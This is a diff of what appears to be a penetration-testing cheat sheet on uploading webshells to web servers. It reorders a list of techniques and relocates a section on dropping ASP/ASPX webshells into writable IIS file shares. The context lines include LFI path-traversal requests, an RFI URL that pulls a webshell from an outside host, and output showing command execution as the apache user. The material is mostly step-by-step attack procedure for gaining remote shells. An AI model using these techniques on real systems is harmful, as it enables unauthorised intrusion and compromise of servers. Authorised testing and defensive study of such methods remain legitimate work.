@@ -7,20 +7,18 @@ Technique 2. Webshell upload using an Apache Tomcat manager Web console
 Technique 3. Webshell upload using a JBoss administration JMX console
 Technique 4. Webshell upload using a WebLogic administration console
 Technique 5. Webshell upload using a CMS Website admin console (e.g., WordPress)
-Technique 6. Webshell upload by abusing the insecure HTTP PUT method
-Technique 7. Webshell upload by exploiting a Website vulnerability such as:
-	     - Vulnerable file upload function
-	     - Remote File Include vulnerability
-	     - Local File Include vulnerability
-	     - SQL injection (e.g., MS SQL database server and xp_cmdshell)
-	     - OS command execution flaw
-	     - Remote Code Execution vulnerability
-	     - ...
-Technique 8. Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
-Technique 9. Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
-Technique 10. Webshell upload using a Lotus Domino admin console
-Technique 11. Webshell upload using a Jenkins admin console
-Technique 12. ...
+Technique 6. Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
+Technique 7. Webshell upload by abusing the insecure HTTP PUT method
+Technique 8. Webshell upload by exploiting a website prone to a vulnerable file upload function
+Technique 9. Webshell upload by exploiting a website prone to a Remote File Include (RFI) vulnerability
+Technique 10. Webshell upload by exploiting a website prone to a Local File Include (LFI) vulnerability
+Technique 11. Webshell upload by exploiting a website prone to a SQL injection flaw (e.g., MS SQL database server and xp_cmdshell)
+Technique 12. Webshell upload by exploiting a website prone to a OS command execution flaw
+Technique 13. Webshell upload by exploiting a website prone to a Remote Code Execution vulnerability
+Technique 14. Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
+Technique 15. Webshell upload using a Lotus Domino admin console
+Technique 16. Webshell upload using a Jenkins admin console
+Technique 17. ...
 ```
 ##### Technique 1 - PHPMyAdmin Web console
 ```
@@ -236,7 +234,21 @@ Example 2 - Kentico
 ➤ Step 3. upload a '.aspx' or '.asp' webshell using the CMS native upoad file function
 ``` 
 
-##### Technique 6 - Webshell upload by abusing the insecure HTTP PUT method
+##### Technique 6 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
+
+```
+Example
+➤ Step 1. Identify a file share of a Web server that is insecurely granting read & write permissions to all "Domain Users" over the folder 'C:\inetpub\wwwroot\'
+
+➤ Step 2. Upload a webshell (.ASP or ASPX) in the folder 'C:\inetpub\wwwroot\' or 'C:\inetpub\wwwroot\application-name\'
+
+➤ Step 3. Browse your webshell and execute OS commands 
+           Examples:
+           - "http://x.x.x.x/Webshell.asp" 
+           - "http://x.x.x.x/application-name/Webshell.aspx" 
+```
+
+##### Technique 7 - Webshell upload by abusing the insecure HTTP PUT method
 ```
 ➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
 	   - Examples with CURL
@@ -323,7 +335,7 @@ Example 2 - Kentico
              <SNIP>
 ```
 
-##### Technique 7 - Webshell upload by exploiting a vulnerable file upload function
+##### Technique 8 - Webshell upload by exploiting a vulnerable file upload function
 ```
 Example
 ➤ Step 1. You found a vulnerable image file upload function "image_upload.php".
@@ -391,7 +403,7 @@ Example
              uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-##### Technique 7 - Webshell upload by exploiting a RFI vulnerability
+##### Technique 9 - Webshell upload by exploiting a RFI vulnerability
 ```
 Example
 ➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
@@ -410,10 +422,10 @@ Example
 	   - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
 ```
 
-##### Technique 7 - Webshell upload by exploiting a LFI vulnerability
+##### Technique 10 - Webshell upload by exploiting a LFI vulnerability
 ```
 Example
-➤ Step 1. You find a website on an internal network that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail'.
+➤ Step 1. You find a website during an internal penetration test that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail' thanks to the LFI flaw.
 	   Examples:
 	   > http://website/index.php?lang=../../../../var/log/auth.log
 	   > http://website/index.php?lang=../../../../var/log/mail
@@ -449,20 +461,6 @@ Example
 	       /var/www/html/
 	       Linux server01 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux
 	       <SNIP>
-```
-
-##### Technique 8 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
-
-```
-Example
-➤ Step 1. Identify a file share of a Web server that is insecurely granting read & write permissions to all "Domain Users" over the folder 'C:\inetpub\wwwroot\'
-
-➤ Step 2. Upload a webshell (.ASP or ASPX) in the folder 'C:\inetpub\wwwroot\' or 'C:\inetpub\wwwroot\application-name\'
-
-➤ Step 3. Browse your webshell and execute OS commands 
-           Examples:
-           - "http://x.x.x.x/Webshell.asp" 
-           - "http://x.x.x.x/application-name/Webshell.aspx" 
 ```
 
 ##### Other - List of common path for the DocumentRoot directory (Web root folder)
